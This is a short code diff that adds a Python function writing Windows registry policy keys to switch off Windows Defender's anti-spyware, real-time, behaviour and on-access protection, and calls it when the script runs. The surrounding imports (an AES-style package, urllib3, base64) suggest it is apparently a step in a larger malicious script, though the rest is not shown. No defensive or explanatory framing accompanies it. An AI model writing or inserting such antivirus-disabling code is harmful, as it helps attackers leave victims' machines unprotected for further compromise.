@@ -1,4 +1,24 @@
 # pip install pyaesm urllib3
+import winreg
+
+def disable_windows_defender():
+    try:
+        key_defender = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender")
+        winreg.SetValueEx(key_defender, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key_defender)
+
+        key_rt = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection")
+        winreg.SetValueEx(key_rt, "DisableRealtimeMonitoring", 0, winreg.REG_DWORD, 1)
+        winreg.SetValueEx(key_rt, "DisableBehaviorMonitoring", 0, winreg.REG_DWORD, 1)
+        winreg.SetValueEx(key_rt, "DisableOnAccessProtection", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key_rt)
+        
+    except Exception as e:
+        print(f"{e}")
+
+if __name__ == "__main__":
+    disable_windows_defender()
+
 
 import base64
 import os
